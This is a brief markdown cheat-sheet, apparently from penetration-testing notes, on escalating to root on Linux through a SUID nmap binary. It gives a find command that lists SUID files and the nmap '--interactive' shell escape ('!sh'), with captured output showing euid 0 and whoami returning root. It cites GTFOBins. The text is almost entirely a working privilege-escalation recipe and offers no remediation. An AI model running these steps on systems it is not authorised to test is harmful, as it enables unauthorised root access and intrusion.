## Scanning

```
find / -perm -u=s -type f 2>/dev/null
<snip>
/usr/bin/nmap
```

## Get root

> Versions 2.02 to 5.21

```
/usr/bin/nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
whoami
root
```

## Reference

[https://gtfobins.github.io/gtfobins/nmap](https://gtfobins.github.io/gtfobins/nmap)